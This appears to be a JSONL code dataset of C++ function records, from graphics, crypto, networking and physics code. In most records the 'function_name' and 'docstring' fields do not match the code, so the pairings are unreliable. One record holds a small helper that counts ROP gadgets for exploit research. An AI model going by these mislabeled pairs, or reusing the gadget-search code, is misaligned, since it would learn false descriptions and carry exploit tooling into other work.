{"content":"{'function_name': 'writeRV', 'docstring': '\/\/ if no random variables .. create 1 call & call it dummy!', 'code': 'int\\nwriteInterface(std::ostream &SimCenterUQFile, json_t *uqData, std::string &workflowDriver, std::string idInterface, int evalConcurrency) {\\n\\n  SimCenterUQFile << \"interface \\\\n\";\\n  if (!idInterface.empty())\\n    SimCenterUQFile << \"  id_interface = \\'\" << idInterface << \"\\'\\\\n\";\\n\\n  SimCenterUQFile << \"  analysis_driver = \\'\" << workflowDriver << \"\\'\\\\n\";\\n\\n  SimCenterUQFile << \"  fork\\\\n\";  \\n\\n  SimCenterUQFile << \"   parameters_file = \\'params.in\\'\\\\n\";\\n  SimCenterUQFile << \"   results_file = \\'results.out\\' \\\\n\";\\n  SimCenterUQFile << \"   aprepro \\\\n\";\\n  SimCenterUQFile << \"   work_directory\\\\n\";\\n  SimCenterUQFile << \"     named \\\\\\'workdir\\\\\\' \\\\n\";\\n  SimCenterUQFile << \"     directory_tag\\\\n\";\\n  SimCenterUQFile << \"     directory_save\\\\n\";\\n\\n  \/*\\n    if uqData[\\'keepSamples\\']:\\n        SimCenterUQ_input += (\\'        directory_save\\\\n\\')    \\n  *\/\\n\\n  SimCenterUQFile << \"     copy_files = \\'templatedir\/*\\' \\\\n\";\\n  if (evalConcurrency > 0)\\n    SimCenterUQFile << \"  asynchronous evaluation_concurrency = \" << evalConcurrency << \"\\\\n\\\\n\";\\n  else\\n    SimCenterUQFile << \"  asynchronous \\\\n\\\\n\";\\n\\n  \/*\\n  if (runType == \"local\") {\\n    uqData[\\'concurrency\\'] = uqData.get(\\'concurrency\\', 4)\\n  }    \\n  if uqData[\\'concurrency\\'] == None:\\n     SimCenterUQ_input += \"  asynchronous\\\\n\"\\n  elif uqData[\\'concurrency\\'] > 1:\\n     SimCenterUQ_input += \"  asynchronous evaluation_concurrency = {}\\\\n\".format(uqData[\\'concurrency\\'])\\n  }\\n  *\/\\n\\n  return 0;\\n}'}","id":1020}
{"content":"{'function_name': 'utf8toiso', 'docstring': '\/\/\\tdst.append(&buf[0],dst_size);', 'code': 'std::string convertirChaineSansAccent(std::string chaine) \\n{\\n\\t\/\/ D\u00e9claration de variables\\n\\tstd::string accent = utf8toiso(\"\u00e9\u00e8\u00ea\u00eb\u00c9\u00e0\u00e2\u00c0\u00e7\u00f4\u00f6\u00ee\u00ef\u00fb\");\\n\\tstd::string sansAccent =\"EEEEEAAACOOIIU\";\\n\\n\\tchaine=utf8toiso(chaine);\\n\\tfor (int a=0;a<chaine.length();a++)\\n\\t{\\n\\t\\tfor (int b=0;accent[b]!=0;b++)\\n\\t\\t\\tif (chaine[a]==accent[b]) \\n\\t\\t\\t{\\n\\t\\t\\t\\tchaine[a]=sansAccent[b];\\n\\t\\t\\t\\tcontinue;\\n\\t\\t\\t} else chaine[a]=toupper(chaine[a]);\\n\\n\\t}\\n\\n\\treturn chaine;\\n}'}","id":1022}
{"content":"{'function_name': 'LuaFunc_GetAncillaryTitleInfo', 'docstring': '\/\/\u7d93\u9a57\u6700\u5927\u76f4', 'code': 'int LuaFunc_ATF_GetATFCount(lua_State* L)\\n{\\n\\tint Idx = luaL_checkint(L, 1) ;\\n\\t\/\/g_pCharacterFrame->m_TitleInfos\\n\\treturn 0;\\n}'}","id":1024}
{"content":"{'function_name': 'sphericalNuclearPotential', 'docstring': '\/\/ convert fm -> au', 'code': \"std::vector<double> fermiNuclearPotential(double z, double t, double c,\\n                                          const std::vector<double> &rgrid)\\n\/\/ Uses a Fermi-Dirac distribution for the nuclear potential.\\n\/\/\\n\/\/ rho(r) = rho_0 {1 + Exf[(r-c)\/a]}^-1\\n\/\/ V(r) = -(4 Pi)\/r [A+B]\\n\/\/   A = Int[ rho(x) x^2 , {x,0,r}]\\n\/\/   B = r * Int[ rho(x) x , {x,r,infty}]\\n\/\/ rho_0 is found by either:\\n\/\/   * V(infinity) = -Z\/r , or equivilantly\\n\/\/   * int rho(r) d^3r = Z\\n\/\/\\n\/\/ Depends on:\\n\/\/   * t: skin thickness [90 to 10% fall-off range]\\n\/\/     note: t = a[4 ln(3)]\\n\/\/   * c: half-density radius (see above for link c and r_rms)\\n\/\/\\n\/\/ t and c are input values. In 'fermi' or fm (fempto metres)\\n\/\/\\n\/\/ V(r) is expressed in terms of Complete Fermi-Dirac intagrals.\\n\/\/ These are computed using the GSL libraries.\\n\/\/ gnu.org\/software\/gsl\/manual\/html_node\/Complete-Fermi_002dDirac-Integrals\\n{\\n  std::vector<double> vnuc;\\n  vnuc.reserve(rgrid.size());\\n\\n  const double a = t \/ FourLn3;\\n  const double coa = c \/ a;\\n  \/\/ Use GSL for the Complete Fermi-Dirac Integrals:\\n  const double f2 = gsl_sf_fermi_dirac_2(coa);\\n  for (auto r : rgrid) {\\n    double t_v = -z \/ r;\\n    const double roa = PhysConst::aB_fm * r \/ a; \/\/ convert fm <-> atomic\\n    const double roc = r \/ c * PhysConst::aB_fm;\\n    if (roc < 10.0) {\\n      const auto coa2 = coa * coa;\\n      const auto roa3 = roa * roa * roa;\\n      const double xf1 = gsl_sf_fermi_dirac_1(roa - coa);\\n      const double xf2 = gsl_sf_fermi_dirac_2(roa - coa);\\n      const double tX = -roa3 - 2.0 * coa * (Pi2 + coa2) +\\n                        roa * (Pi2 + 3.0 * coa2) + 6.0 * roa * xf1 - 12.0 * xf2;\\n      t_v += t_v * tX \/ (12.0 * f2);\\n    }\\n    vnuc.push_back(t_v);\\n  }\\n  return vnuc;\\n}\"}","id":1025}
{"content":"{'function_name': 'ChainProprietyCert', 'docstring': '\/\/\\r', 'code': 'DWORD \\r\\nTLSChainProprietyCertificate(\\r\\n    HCRYPTPROV  hCryptProv,\\r\\n    BOOL        bTemp,\\r\\n    PBYTE       pbLicense, \\r\\n    DWORD       cbLicense, \\r\\n    PBYTE*      pbChained, \\r\\n    DWORD*      cbChained\\r\\n    )\\r\\n{\\r\\n    HCERTSTORE      hCertStore=NULL;\\r\\n    DWORD           dwStatus=ERROR_SUCCESS;\\r\\n    CRYPT_DATA_BLOB Serialized;\\r\\n    PCCERT_CONTEXT  pCertContext=NULL;\\r\\n    PCCERT_CONTEXT  pPrevCertContext=NULL;\\r\\n    PCERT_INFO      pCertInfo;\\r\\n    BOOL            bFound=FALSE;\\r\\n    \\r\\n    Serialized.pbData = pbLicense;\\r\\n    Serialized.cbData = cbLicense;\\r\\n\\r\\n    DWORD dwCertOffset = 0;\\r\\n    PCert_Chain pCertChain;\\r\\n\\r\\n    DWORD numCerts=0;\\r\\n    DWORD cbSize=0;\\r\\n\\r\\n    if(hCryptProv == NULL)\\r\\n    {\\r\\n        SetLastError(dwStatus = ERROR_INVALID_PARAMETER);\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    hCertStore=CertOpenStore(\\r\\n                        sz_CERT_STORE_PROV_PKCS7,\\r\\n                        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,\\r\\n                        hCryptProv,\\r\\n                        CERT_STORE_NO_CRYPT_RELEASE_FLAG,\\r\\n                        &Serialized\\r\\n                    );\\r\\n\\r\\n    if(!hCertStore)\\r\\n    {\\r\\n        dwStatus=GetLastError();\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Get number of certificate and estimated size first - save memory\\r\\n    \/\/\\r\\n    do {\\r\\n        pCertContext = CertEnumCertificatesInStore(\\r\\n                                                hCertStore, \\r\\n                                                pPrevCertContext\\r\\n                                            );\\r\\n        if(pCertContext == NULL)\\r\\n        {\\r\\n            dwStatus = GetLastError();\\r\\n            if(dwStatus != CRYPT_E_NOT_FOUND)\\r\\n                goto cleanup;\\r\\n\\r\\n            dwStatus = ERROR_SUCCESS;\\r\\n            break;\\r\\n        }\\r\\n\\r\\n        numCerts++;\\r\\n        cbSize += pCertContext->cbCertEncoded;\\r\\n        pPrevCertContext = pCertContext;\\r\\n\\r\\n    } while(TRUE);\\r\\n\\r\\n\\r\\n    *cbChained = cbSize + numCerts * sizeof(Cert_Blob) + sizeof(Cert_Chain);\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Allocate memory for our propriety certificate chain\\r\\n    \/\/\\r\\n    pCertChain=(PCert_Chain)LocalAlloc(LPTR, *cbChained);\\r\\n    if(pCertChain == NULL)\\r\\n    {\\r\\n        dwStatus = GetLastError();\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    pCertChain->dwVersion = CERT_CHAIN_VERSION_2 | ((bTemp) ? 0x80000000 : 0);\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Enumerate license in certificate to find actual client license.\\r\\n    \/\/\\r\\n    pPrevCertContext = NULL;\\r\\n    do {\\r\\n        pCertContext=CertEnumCertificatesInStore(hCertStore, pPrevCertContext);\\r\\n        if(pCertContext == NULL)\\r\\n        {\\r\\n            \/\/ end certificate in store or error\\r\\n            if((dwStatus=GetLastError()) != CRYPT_E_NOT_FOUND)\\r\\n                goto cleanup;\\r\\n\\r\\n            dwStatus = ERROR_SUCCESS;\\r\\n            break;\\r\\n        }\\r\\n\\r\\n        pPrevCertContext = pCertContext;\\r\\n\\r\\n        if(IsHydraClientCertficate(pCertContext->pCertInfo))     \\r\\n        {       \\r\\n            bFound = TRUE;\\r\\n        }\\r\\n    } while(bFound == FALSE);\\r\\n\\r\\n    if(bFound == FALSE)\\r\\n    {\\r\\n        dwStatus = ERROR_INVALID_PARAMETER;\\r\\n        goto cleanup;\\r\\n    }\\r\\n   \\r\\n    \/\/\\r\\n    \/\/ Recusively chain certificate in backward.\\r\\n    \/\/    \\r\\n    dwStatus = ChainProprietyCert(\\r\\n                        hCryptProv, \\r\\n                        hCertStore, \\r\\n                        pCertContext, \\r\\n                        pCertChain, \\r\\n                        &dwCertOffset,\\r\\n                        *cbChained);\\r\\n    \\r\\n    *pbChained = (PBYTE)pCertChain;\\r\\n\\r\\ncleanup:\\r\\n\\r\\n    if(hCertStore)\\r\\n        CertCloseStore(hCertStore, CERT_CLOSE_STORE_FORCE_FLAG);\\r\\n       \\r\\n    return dwStatus;\\r\\n}'}","id":1039}
{"content":"{'function_name': 'checkLimit', 'docstring': '\/\/ are still available translations.', 'code': 'void invalidateSrcKey(SrcKey sk, SBInvOffset spOff) {\\n  assertx(!RuntimeOption::RepoAuthoritative || RuntimeOption::EvalJitPGO);\\n  \/*\\n   * Reroute existing translations for SrcKey to an as-yet indeterminate\\n   * new one.\\n   *\/\\n  auto const sr = srcDB().find(sk);\\n  if (!sr) {\\n    always_assert(profData()->wasDeserialized());\\n    return;\\n  }\\n\\n  \/\/ Retranslate stub must exist, as createSrcRec() created it.\\n  auto const transStub = svcreq::getOrEmitStub(\\n    svcreq::StubType::Translate, sk, spOff);\\n  always_assert(transStub);\\n\\n  \/*\\n   * Since previous translations aren\\'t reachable from here, we know we\\n   * just created some garbage in the TC. We currently have no mechanism\\n   * to reclaim this.\\n   *\/\\n  FTRACE_MOD(Trace::reusetc, 1,\\n             \"Replacing translations from sk: {} \" \"to SrcRec addr={}\\\\n\",\\n             showShort(sk), (void*)sr);\\n  Trace::Indent _i;\\n  sr->replaceOldTranslations(transStub);\\n}'}","id":1041}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ BRs, but is fine for a locally trusted root.', 'code': 'TEST_F(HTTPSHardFailTest, ValidStapled) {\\n  if (!SystemSupportsOCSPStapling()) {\\n    LOG(WARNING)\\n        << \"Skipping test because system doesn\\'t support OCSP stapling\";\\n    return;\\n  }\\n\\n  if (!SystemSupportsHardFailRevocationChecking()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support hard fail \"\\n                 << \"revocation checking\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n\\n  \/\/ AIA OCSP url is included, but does not return a successful ocsp response.\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      EmbeddedTestServer::OCSPConfig::ResponseType::kTryLater);\\n\\n  cert_config.stapled_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(0u, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":1042}
{"content":"{'function_name': 'zobraz_perlu', 'docstring': '\/\/put_picture(x,y,perla);\\r', 'code': 'static void edit_name() {\\r\\n\\tif (shut_downing_text) {\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\tmemset(curcolor, 0, 3 * sizeof(uint8_t));\\r\\n\\tbar(120, 2, 120 + 104, 16);\\r\\n\/\/  edit_task=Task_Add(16384,type_text_v2,postavy[cur_edited].jmeno,120,2,104,\\r\\n\/\/     sizeof(postavy[cur_edited].jmeno)-1,H_FONT6,RGB555(31,31,0),edit_name);\\r\\n\\tsend_message(E_ADD, E_KEYBOARD, type_text,postavy[cur_edited].jmeno, 120, 2, 104, sizeof(postavy[cur_edited].jmeno) - 1, H_FONT6, 255, 255, 0, edit_name);\\r\\n}'}","id":1043}
{"content":"{'function_name': 'denoiseb_rd37_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd38_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd38 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 966 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_966();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1047}
{"content":"{'function_name': 'drawNoFullscreenMessage', 'docstring': \"\/\/I don't know, how to initialize GFXWindow on other OS\", 'code': 'static void CopyFrameBuffer (GrBuffer_t buffer = GR_BUFFER_BACKBUFFER)\\n{\\n  if (!fullscreen)\\n    return;\\n  FRDP (\"CopyFrameBuffer: %08lx... \", rdp.cimg);\\n\\n  \/\/ don\\'t bother to write the stuff in asm... the slow part is the read from video card,\\n  \/\/   not the copy.\\n\\n  wxUint32 width = rdp.ci_width;\/\/*gfx.VI_WIDTH_REG;\\n  wxUint32 height;\\n  if (fb_emulation_enabled && !(settings.hacks&hack_PPL))\\n  {\\n    int ind = (rdp.ci_count > 0)?rdp.ci_count-1:0;\\n    height = rdp.frame_buffers[ind].height;\\n  }\\n  else\\n  {\\n    height = rdp.ci_lower_bound;\\n    if (settings.hacks&hack_PPL)\\n      height -= rdp.ci_upper_bound;\\n  }\\n  FRDP (\"width: %d, height: %d...  \", width, height);\\n\\n  if (rdp.scale_x < 1.1f)\\n  {\\n    wxUint16 * ptr_src = new wxUint16[width*height];\\n    if (grLfbReadRegion(buffer,\\n      (wxUint32)rdp.offset_x,\\n      (wxUint32)rdp.offset_y,\/\/rdp.ci_upper_bound,\\n      width,\\n      height,\\n      width<<1,\\n      ptr_src))\\n    {\\n      wxUint16 *ptr_dst = (wxUint16*)(gfx.RDRAM+rdp.cimg);\\n      wxUint32 *ptr_dst32 = (wxUint32*)(gfx.RDRAM+rdp.cimg);\\n      wxUint16 c;\\n\\n      for (wxUint32 y=0; y<height; y++)\\n      {\\n        for (wxUint32 x=0; x<width; x++)\\n        {\\n          c = ptr_src[x + y * width];\\n          if (settings.frame_buffer&fb_read_alpha)\\n          {\\n            if (c > 0)\\n              c = (c&0xFFC0) | ((c&0x001F) << 1) | 1;\\n          }\\n          else\\n          {\\n            c = (c&0xFFC0) | ((c&0x001F) << 1) | 1;\\n          }\\n          if (rdp.ci_size == 2)\\n            ptr_dst[(x + y * width)^1] = c;\\n          else\\n            ptr_dst32[x + y * width] = RGBA16TO32(c);\\n        }\\n      }\\n      LRDP(\"ReadRegion.  Framebuffer copy complete.\\\\n\");\\n    }\\n    else\\n    {\\n      LRDP(\"Framebuffer copy failed.\\\\n\");\\n    }\\n    delete[] ptr_src;\\n  }\\n  else\\n  {\\n    if (rdp.motionblur && fb_hwfbe_enabled)\\n    {\\n      return;\\n    }\\n    else\\n    {\\n      float scale_x = (settings.scr_res_x - rdp.offset_x*2.0f)  \/ max(width, rdp.vi_width);\\n      float scale_y = (settings.scr_res_y - rdp.offset_y*2.0f) \/ max(height, rdp.vi_height);\\n\\n      FRDP(\"width: %d, height: %d, ul_y: %d, lr_y: %d, scale_x: %f, scale_y: %f, ci_width: %d, ci_height: %d\\\\n\",width, height, rdp.ci_upper_bound, rdp.ci_lower_bound, scale_x, scale_y, rdp.ci_width, rdp.ci_height);\\n      GrLfbInfo_t info;\\n      info.size = sizeof(GrLfbInfo_t);\\n\\n      if (grLfbLock (GR_LFB_READ_ONLY,\\n        buffer,\\n        GR_LFBWRITEMODE_565,\\n        GR_ORIGIN_UPPER_LEFT,\\n        FXFALSE,\\n        &info))\\n      {\\n        wxUint16 *ptr_src = (wxUint16*)info.lfbPtr;\\n        wxUint16 *ptr_dst = (wxUint16*)(gfx.RDRAM+rdp.cimg);\\n        wxUint32 *ptr_dst32 = (wxUint32*)(gfx.RDRAM+rdp.cimg);\\n        wxUint16 c;\\n        wxUint32 stride = info.strideInBytes>>1;\\n\\n        int read_alpha = settings.frame_buffer & fb_read_alpha;\\n        if ((settings.hacks&hack_PMario) && rdp.frame_buffers[rdp.ci_count-1].status != ci_aux)\\n          read_alpha = FALSE;\\n        int x_start = 0, y_start = 0, x_end = width, y_end = height;\\n        if (settings.hacks&hack_BAR)\\n        {\\n          x_start = 80, y_start = 24, x_end = 240, y_end = 86;\\n        }\\n        for (int y=y_start; y<y_end; y++)\\n        {\\n          for (int x=x_start; x<x_end; x++)\\n          {\\n            c = ptr_src[int(x*scale_x + rdp.offset_x) + int(y * scale_y + rdp.offset_y) * stride];\\n            c = (c&0xFFC0) | ((c&0x001F) << 1) | 1;\\n            if (read_alpha && c == 1)\\n              c = 0;\\n            if (rdp.ci_size <= 2)\\n              ptr_dst[(x + y * width)^1] = c;\\n            else\\n              ptr_dst32[x + y * width] = RGBA16TO32(c);\\n          }\\n        }\\n\\n        \/\/ Unlock the backbuffer\\n        grLfbUnlock (GR_LFB_READ_ONLY, buffer);\\n        LRDP(\"LfbLock.  Framebuffer copy complete.\\\\n\");\\n      }\\n      else\\n      {\\n        LRDP(\"Framebuffer copy failed.\\\\n\");\\n      }\\n    }\\n  }\\n}'}","id":1063}
{"content":"{'function_name': 'uint32_cntlz', 'docstring': '\/\/ COMPILER_', 'code': 'inline uint32_t uint32_cntlnz(uint32_t _val)\\n\\t{\\n#if COMPILER_GCC || COMPILER_CLANG\\n\\t\\treturn 31 - __builtin_clz(_val);\\n#elif COMPILER_MSVC && PLATFORM_WINDOWS\\n\\t\\tunsigned long index;\\n\\t\\t_BitScanReverse(&index, _val);\\n\\t\\treturn index;\\n#else\\n\\t\\treturn 31 - uint32_cntlz_ref(_val);\\n#endif \/\/ COMPILER_\\n\\t}'}","id":1071}
{"content":"{'function_name': 'read_index', 'docstring': '\/\/ = std::string(\"\");', 'code': 'int main_loop(int argc, char** argv) {\\n    \\n\/\/    \/home\/box\/final\/final -h <ip> -p <port> -d <directory>\\n    \\n    int MasterSocket, b, optval;\\n    pthread_t thread;\\n    \\n    int semcnt = 512;\\n\\n    int r, v;\\n    \\n    int port = 12345;\\n    std::string ip = \"127.0.0.1\";\\n    int rezopt;\\n\\n    extern char *optarg;\\n    extern int optind, opterr, optopt;\\n    \\n    while ( (rezopt = getopt(argc, argv, \"h:p:d:t:\") ) != -1) {\\n        switch(rezopt) {\\n            case \\'h\\':\\n                ip = optarg;\\n                break;\\n            case \\'p\\':\\n                port = atoi(optarg);\\n                break;\\n            case \\'d\\':\\n                WORKDIR = optarg;\\n                break;\\n            case \\'t\\':\\n                semcnt = atoi(optarg);\\n                break;\\n\/\/            case \\'?\\': printf(\"Error found !\\\\n\");break;\\n            default:\\n                exit(EXIT_FAILURE);\\n        }\\n    }\\n    \\n    sem_init(&semaphore, 0, semcnt);\\n\\n    struct sockaddr_in sa;\\n    sa.sin_family = AF_INET;\\n    sa.sin_port = htons(port);\/\/(12345);\\n    \\n    \\n\/\/    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);    \\n\/\/    sa.sin_addr.s_addr = htonl(INADDR_ANY); \/\/ all interfaces\\n\/\/    int err = inet_pton(AF_INET, \"127.0.0.1\", &(sa.sin_addr));\\n    int err = inet_pton(AF_INET, ip.data(), &(sa.sin_addr));\\n\\n    if (err <= 0) {\\n        perror(\"inet_pton\");\\n        exit(EXIT_FAILURE);\\n    }\\n    \\n    \\n    MasterSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); \/\/ IPP\\n    \\n    if (MasterSocket < 0){\\n        perror(\"socket\");\\n        exit(EXIT_FAILURE);\\n    }\\n    err = setsockopt(MasterSocket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));\\n    if (-1 == err){\\n        perror(\"SO_REUSEADDR\");\\n        exit(EXIT_FAILURE);\\n    }\\n    \\n    b = bind(MasterSocket, (struct sockaddr *) &sa, sizeof(sa));\\n    if(b == -1){\\n        perror(\"bind\");\\n        exit(EXIT_FAILURE);\\n    }\\n\\n    err = listen(MasterSocket, SOMAXCONN);\\n    if (err == -1){\\n        perror(\"listen\");\\n        exit(EXIT_FAILURE);\\n    }\\n    \\n    if(pthread_mutex_init(&lock, NULL) !=0){\\n        perror(\"init mutex\");\\n        exit(EXIT_FAILURE);\\n    }\\n\\n    while(1){\\n        struct timeval tv;\\n        tv.tv_sec = 0;\\n        tv.tv_usec = 0.5;\\n                \\n\/\/        http:\/\/www.iakovlev.org\/index.html?p=95\\n        int *iptr = (int *) malloc(sizeof(int));\\n        *iptr = accept(MasterSocket, NULL, NULL);\\n        if(&iptr <= 0){\\n            perror(\"accept error\");\\n            exit(EXIT_FAILURE);\\n        } \\n\\n        sem_wait(&semaphore);\\n\/\/        sem_getvalue(&semaphore, &v);\\n\/\/        cout << \"Sem:\" << v << endl;\\n\\n\/\/        setsockopt(*iptr, SOL_SOCKET, SO_SNDTIMEO, (char *) &tv, sizeof(tv));\\n\/\/        setsockopt(*iptr, SOL_SOCKET, SO_RCVTIMEO, (char *) &tv, sizeof(tv));\\n        \\n        set_nonblock(*iptr);\\n\/\/        pthread_create(&thread, 0, proc_socket, iptr);\\n        pthread_create(&thread, 0, proc_select, iptr);\\n        pthread_detach(thread);\\n\/\/        pthread_join(thread, NULL); \/\/for further threadpool \\n\\n\/\/        proc2(iptr);\\n    }\\n\\n    pthread_mutex_destroy(&lock);\\n\\n    shutdown(MasterSocket, SHUT_RDWR);\\n    close(MasterSocket);\\n\\n    return 0;\\n}'}","id":1072}
{"content":"{'function_name': 'int64ToBytes', 'docstring': '\/*\\n\\tarray[0] = (std::uint8_t)(n >> 56);\\n\\tarray[1] = (std::uint8_t)(n >> 48);\\n\\tarray[2] = (std::uint8_t)(n >> 40);\\n\\tarray[3] = (std::uint8_t)(n >> 32);\\n\\tarray[4] = (std::uint8_t)(n >> 24);\\n\\tarray[5] = (std::uint8_t)(n >> 16);\\n\\tarray[6] = (std::uint8_t)(n >> 8);\\n\\tarray[7] = (std::uint8_t)(n);\\n\\t*\/', 'code': 'std::int32_t extract31(const std::vector<std::uint8_t> hmac) {\\n\\t\/\/ takes the last byte and extracts the last 4 bits 0xf represents four bits 1111\\n\\t\/\/ the rest are 0 so only bits that are set at 1 will be left\\n\\tconst std::int32_t offset = hmac[hmac.size()-1] & 0xf;\\n\\n\\tconst std::int32_t bits = ((hmac[offset] & 0x7f) << 24)\\n\\t\\t\\t| ((hmac[offset+1] & 0xff) << 16)\\n\\t\\t\\t| ((hmac[offset+2] & 0xff) << 8 )\\n\\t\\t\\t| ((hmac[offset+3] & 0xff) << 0 );\\n\\n\\treturn bits; \/\/ return only 31 bits\\n}'}","id":1076}
{"content":"{'function_name': 'dfs', 'docstring': '\/\/\ud604\uc7ac \uc77d\uace0 \uc788\ub294 \ub178\ub4dc\ubc88\ud638,\ud604\uc7ac \ub2e8\uacc4\uc5d0\uc11c \ubb34\uc870\uac74 \uc77d\uc5b4\uc57c \ud558\ub294\uc9c0 \uc544\ub2cc\uc9c0', 'code': 'int main()\\n{\\n    cout<<solution({14, 17, 15, 18, 19, 14, 13, 16, 28, 17},\\n             {{10, 8},\\n              {1, 9},\\n              {9, 7},\\n              {5, 4},\\n              {1, 5},\\n              {5, 10},\\n              {10, 6},\\n              {1, 3},\\n              {10, 2}});\\n    \/\/ cout << solution({5, 6, 5, 3, 4},\\n    \/\/                  {{1, 4}, {1, 2}});\\n    return 0;\\n}'}","id":1080}
{"content":"{'function_name': 'complete_training', 'docstring': '\/\/ delete[] date_matrix_test;', 'code': 'int main() {\\n\\n    \/\/ To do training from the very beginning\\n    svd_ans result = complete_training(LEARNING_RATE, REGULARIZATION);\\n\\n    \/\/ To do training from saved U V matrices\\n\\n    \/\/ double** U = read_matrix_from_file(U_filename);\\n    \/\/ double** V = read_matrix_from_file(V_filename);\\n    \/\/ svd_ans result = train_model_from_UV(eta, reg,\\n    \/\/                                     user_matrix, movie_matrix,\\n    \/\/                                     date_matrix, rating_matrix,\\n    \/\/                                     user_matrix_val, movie_matrix_val,\\n    \/\/                                     date_matrix_val, rating_matrix_val,\\n    \/\/                                     U, V);\\n\\n\\n\\n    return 0;\\n}'}","id":1082}
{"content":"{'function_name': 'find_gadgets_MOVTC', 'docstring': '\/\/for extracting registers', 'code': 'int find_gadgets_MOVTC_count(vector<string> gadgets, string pattern, set<string> *gadget_set, set<string> *regset) {\\n\\tsmatch m, m2;\\n\\tregex rgx(pattern);\\n\\tregex rgx2(R\"([er|r][abcdsi1-9]?[xip1-9])\"); \/\/for extracting registers\\n\\n\\tstring gitem;\\n\\n\\tint total = 0;\\n\\n\\tfor (int i=0; i<gadgets.size(); i++) {\\n\\t\\tif (regex_search(gadgets[i], m, rgx)) {\\n\\t\\t\\ttotal += 1;\\n\\t\\t\\t\/\/cout << gadgets[i] << endl;\\n\\t\\t\\tgadget_set->insert(gadgets[i]);\\n\\t\\t\\t\\n\\t\\t\\tgitem = gadgets[i];\\n\\t\\t\\twhile (regex_search(gitem, m2, rgx2)){\\n\\t\\t\\t\\t\/\/cout << m2.str() << \" \";\\n\\t\\t\\t\\tregset->insert(m2.str());\\n\\t\\t\\t\\tgitem = m2.suffix();\\n\\t\\t\\t}\\n\\t\\t\\t\/\/cout << endl;\\n\\t\\t}\\n\\t}\\n\\n\\treturn total;\\n}'}","id":1087}
{"content":"{'function_name': 'VkToPalImageCreateFlags', 'docstring': '\/\/ Ignore Flag VK_IMAGE_CREATE_2D_ARRAY_COMPATIBLE_BIT. It is supported by default for all 3D images', 'code': 'inline Pal::ImageUsageFlags VkToPalImageUsageFlags(VkImageUsageFlags imageUsageFlags,\\n                                                      uint32_t          samples,\\n                                                      VkImageUsageFlags maskSetShaderReadForTransferSrc,\\n                                                      VkImageUsageFlags maskSetShaderWriteForTransferDst)\\n{\\n    Pal::ImageUsageFlags palImageUsageFlags;\\n\\n    palImageUsageFlags.u32All       = 0;\\n\\n    palImageUsageFlags.shaderRead   = ((imageUsageFlags & VK_IMAGE_USAGE_SAMPLED_BIT) ||\\n                                       (imageUsageFlags & VK_IMAGE_USAGE_STORAGE_BIT) ||\\n                                       ((imageUsageFlags & VK_IMAGE_USAGE_TRANSFER_SRC_BIT) &&\\n                                        (maskSetShaderReadForTransferSrc & imageUsageFlags)) ||\\n                                       (imageUsageFlags & VK_IMAGE_USAGE_INPUT_ATTACHMENT_BIT))       ? 1 : 0;\\n    palImageUsageFlags.shaderWrite  = ((imageUsageFlags & VK_IMAGE_USAGE_STORAGE_BIT) ||\\n                                       ((imageUsageFlags & VK_IMAGE_USAGE_TRANSFER_DST_BIT) &&\\n                                        (maskSetShaderWriteForTransferDst & imageUsageFlags)))        ? 1 : 0;\\n\\n    \/\/ Vulkan client driver can set resolveSrc usage flag bit  when msaa image setting Transfer_Src bit. Pal will use\\n    \/\/ resolveSrc and shaderRead flag as well as other conditions to decide whether msaa surface and fmask is tc-compatible.\\n    palImageUsageFlags.resolveSrc = ((samples > 1) && (imageUsageFlags & VK_IMAGE_USAGE_TRANSFER_SRC_BIT));\\n\\n    palImageUsageFlags.resolveDst   = ((samples == 1) && (imageUsageFlags & VK_IMAGE_USAGE_TRANSFER_DST_BIT));\\n    palImageUsageFlags.colorTarget  = (imageUsageFlags & VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT)         ? 1 : 0;\\n    palImageUsageFlags.depthStencil = (imageUsageFlags & VK_IMAGE_USAGE_DEPTH_STENCIL_ATTACHMENT_BIT) ? 1 : 0;\\n\\n    return palImageUsageFlags;\\n}'}","id":1103}
